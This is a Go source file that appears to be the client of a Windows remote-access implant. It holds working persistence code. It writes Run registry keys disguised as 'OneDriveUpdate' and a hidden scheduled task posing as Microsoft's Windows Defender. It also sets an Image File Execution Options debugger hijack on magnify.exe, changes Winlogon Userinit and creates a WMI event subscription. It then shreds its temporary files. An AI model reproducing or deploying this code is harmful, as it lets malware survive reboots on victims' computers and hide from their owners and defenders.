package client

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"syscall"
	"time"

	"github.com/lu4p/shred"
	"golang.org/x/sys/windows/registry"
)

var (
	Path         = filepath.Join(os.ExpandEnv("$AppData"), "WindowsDefender")
	PathExe      = filepath.Join(Path, "WindowsDefender.exe")
	HostnamePath = filepath.Join(Path, "token")
)

// CheckElevate checks whether the current process has administrator
// privileges
func CheckElevate() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	return err != nil
}

// getVer gets the major version of the current installed
// Windows
func getVer() (int, error) {
	cmd := exec.Command("cmd", "ver")
	var out bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &stderr
	err := cmd.Run()
	if err != nil {
		return 0, err
	}
	osStr := strings.Replace(out.String(), "\n", "", -1)
	osStr = strings.Replace(osStr, "\r\n", "", -1)
	tmp1 := strings.Index(osStr, "[Version")
	tmp2 := strings.Index(osStr, "]")
	if tmp1 == -1 || tmp2 == -1 {
		return 0, errors.New("version string has wrong format")
	}
	longVer := osStr[tmp1+9 : tmp2]
	majorVerStr := strings.SplitN(longVer, ".", 2)[0]
	majorVerInt, err := strconv.Atoi(majorVerStr)
	if err != nil {
		return 0, errors.New("version could not be converted to int")
	}
	return majorVerInt, nil
}

// TODO: Persit on different locations on disk
// TODO: Add Fileless persistence as shown by
// https://github.com/ewhitehats/InvisiblePersistence

// Persist makes sure that the executable is run after a reboot
func Persist(path string) {
	elevated := CheckElevate()
	if elevated {
		persistAdmin(path)
	} else {
		persistUser(path)
	}
}

// persistAdmin persistence using admin privileges
func persistAdmin(path string) {
	go schtasks(path)
	go ifeo(path)
	go userinit(path)
	go wmic(path)
	go hklm(path)
}

// persistUser persistence using user privileges
func persistUser(path string) {
	version, _ := getVer()
	if version == 10 {
		go people(path)
		go cortana(path)
	}
	hkcu(path)
}

// cortana noadmin works on win 10
func cortana(path string) error {
	// TODO: Add cortana persitence https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/persist/persist_cortana.py
	return errors.New("not implemented")
}

// people noadmin works on Win10
func people(path string) error {
	// TODO: Add people persitence https://github.com/rootm0s/WinPwnage/blob/master/winpwnage/functions/persist/persist_people.py
	return errors.New("not implemented")
}

// hkcu noadmin should just work
func hkcu(path string) error {
	key, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	err = key.SetStringValue("OneDriveUpdate", path)
	if err != nil {
		return err
	}
	log.Println("hkcu success")
	return nil
}

// hklm admin
func hklm(path string) error {
	keypath := `Software\Microsoft\Windows\CurrentVersion\Run`
	if runtime.GOARCH == "386" {
		keypath = `Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Run`
	}
	key, _, err := registry.CreateKey(
		registry.LOCAL_MACHINE, keypath,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	err = key.SetStringValue("OneDriveUpdate", path)
	if err != nil {
		return err
	}
	log.Println("hklm success")
	return nil
}

// schtask is needed for scheduled task persistence
var schtask = `<?xml version="1.0" encoding="UTF-16"?>

<Task version="1.3" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>Microsoft Corporation</Author>
    <Description>Keep your PC safe with trusted antivirus protection built-in to Windows 10. Windows Defender Antivirus delivers comprehensive, ongoing and real-time protection against software threats like viruses, malware and spyware across email, apps, the cloud and the web.
    </Description>
    <URI>\\WindowsDefender</URI>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
      <Delay>PT1M</Delay>
    </LogonTrigger>
  </Triggers>

  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>

  <Settings>
    <MultipleInstancesPolicy>StopExisting</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>2</Priority>
    <RestartOnFailure>main
      <Interval>PT1M</Interval>
      <Count>999</Count>
    </RestartOnFailure>
  </Settings>

  <Actions Context="Author">
    <Exec>
      <Command>` + PathExe + `</Command>
      <WorkingDirectory>` + os.ExpandEnv("~") + `</WorkingDirectory>
    </Exec>
  </Actions>
</Task>`

// schtask admin
func schtasks(path string) error {
	xmlTemplate := schtask
	tempxml := filepath.Join(Path, "temp.xml")
	err := ioutil.WriteFile(tempxml, []byte(xmlTemplate), 0666)
	if err != nil {
		return err
	}

	cmd := exec.Command("cmd", "/C", "schtasks /create /xml %s /tn OneDriveUpdate", filepath.Join(Path, "temp.xml"))
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}

	time.Sleep(5 * time.Second)
	shred.Conf{1, true, true}.File(tempxml)
	log.Println("schtask success")
	return nil
}

// ifeo admin
func ifeo(path string) error {
	access, _, err := registry.CreateKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Accessibility`,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer access.Close()
	keypath := `Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`
	if runtime.GOARCH == "386" {
		keypath = `Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe`
	}
	magnify, _, err := registry.CreateKey(
		registry.CURRENT_USER, keypath,
		registry.SET_VALUE|registry.ALL_ACCESS)
	if err != nil {
		return err
	}
	defer magnify.Close()
	if err := magnify.SetStringValue("Configuration", "magnifierpane"); err != nil {
		return err
	}

	if err := access.SetStringValue("Debugger", path); err != nil {
		return err
	}
	log.Println("ifeo success")
	return nil
}

// userinit admin
func userinit(path string) error {
	key, _, err := registry.CreateKey(
		registry.LOCAL_MACHINE, `Software\Microsoft\Windows NT\CurrentVersion\Winlogon`,
		registry.QUERY_VALUE|registry.SET_VALUE|registry.ALL_ACCESS,
	)
	if err != nil {
		return err
	}
	defer key.Close()
	err = key.SetStringValue("Userinit", fmt.Sprintf("%s\\System32\\userinit.exe, %s", os.Getenv("SYSTEMROOT"), path))
	if err != nil {
		return err
	}
	log.Println("userinit success")
	return nil
}

// wmic admin
func wmic(path string) error {
	cmd := exec.Command("cmd", "/C",
		"wmic /namespace:'\\\\root\\subscription' PATH __EventFilter CREATE Name='GuacBypassFilter', EventNameSpace='root\\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System''",
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err := cmd.Output()
	if err != nil {
		return err
	}

	time.Sleep(5 * time.Second)

	cmd = exec.Command("cmd", "/C",
		fmt.Sprintf(
			"wmic /namespace:'\\\\root\\subscription' PATH CommandLineEventConsumer CREATE Name='WindowsDefender', ExecutablePath='%s',CommandLineTemplate='%s'",
			path,
			path,
		),
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	time.Sleep(5 * time.Second)

	cmd = exec.Command("cmd", "/C", "wmic /namespace:'\\\\root\\subscription' PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name='GuacBypassFilter'', Consumer='CommandLineEventConsumer.Name='GuacBypassConsomer''")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	_, err = cmd.Output()
	if err != nil {
		return err
	}
	log.Println("wmci success")
	return nil
}
